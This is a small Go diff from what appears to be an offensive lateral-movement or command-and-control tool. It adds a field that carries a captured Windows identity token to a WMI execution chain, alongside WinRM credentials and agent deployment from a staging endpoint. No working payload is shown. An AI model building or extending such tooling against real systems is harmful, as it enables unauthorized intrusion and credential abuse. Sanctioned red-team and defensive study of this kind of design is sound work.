@@ -51,6 +51,11 @@ type lateralPayload struct {
 	Insecure       bool             `json:"insecure,omitempty"`
 	Identity       *lateralIdentity `json:"identity,omitempty"`
 	winrmIdentity  *winrmCredentials
+	// ambientToken carries the lateral worker's captured identity handle
+	// (uintptr transport: the field compiles on every platform) to the WMI
+	// chain, which applies it on the COM worker thread for the cloaked
+	// ambient connect. Unexported, never serialized.
+	ambientToken uintptr
 	// loaderDeploy marks the server-sourced deployment chain: the agent
 	// artifact bytes come from the staging endpoint instead of this
 	// process's own binary, so the source session's hosting mode is
